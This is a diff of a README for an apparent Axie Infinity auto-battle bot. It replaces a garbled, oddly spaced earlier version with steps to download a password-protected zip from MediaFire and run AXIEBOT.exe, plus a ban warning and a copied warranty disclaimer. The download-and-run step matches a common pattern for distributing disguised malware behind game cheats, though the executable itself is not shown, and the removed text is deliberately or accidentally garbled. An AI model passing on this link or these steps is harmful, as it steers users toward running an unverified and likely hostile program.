@@ -4,8 +4,10 @@ Bot uses WinAPI functions to take screenshots and recognize pixels of axie model
 
 Set
 1.Change game resolution to  full-scre en (or ful-scren windowed) and close Sk y avis game client
-2.Download archive with software  htts//ww w.mei fir.cm/file/45 lw0spadamAieBot.zip/file assword:1488
-3.Launch AXIEBOT.exe with corre
-Im not recommend you to playmoretha 24hous e  c  o  u   t a ke  rbiity fo ran ans oblocs
-THE SOFTWARE I PROVIDED  "AS IS WTHO UT W AR A  T  Y  NXR         C   N   G T  LMI EDTO THE  WARANTIES OF MERCHANTABILITY, FITNESS FOR APARTICULAR  PU POSE A  I  F RINGET. I N  VE H A L H E   S R CY H   D ES E    I ABLE FO ANY CLAIM, DAMAGES OR OTHER LIAILITY, WETHER IN AN AIOF R ,TORT HR WSE , AR ING FROM OUTO OR  NE CTION T HH S W AE OR THE US OR OTHER DEALINGS IN THE SOFTWARE. AXIENFIIT BO ,AXIE INFINTYUO ATTLE  BOT, AX I
- 
+2.[Download](https://www.mediafire.com/file/45lsw0mjspoadam/AxieBot.zip/file) archive with software  Password:1488
+3.Launch AXIEBOT.exe and follow the instructions on the screen
+Warning
+Im not recommend you to play more than 24 hours per account. Im not take responsibility for any bans or blocks.
+
+Copyright
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. AXIE INFINITY BOT, AXIE INFINITY AUTO BATTLE BOT, AXIE INFINITY SCRIPT
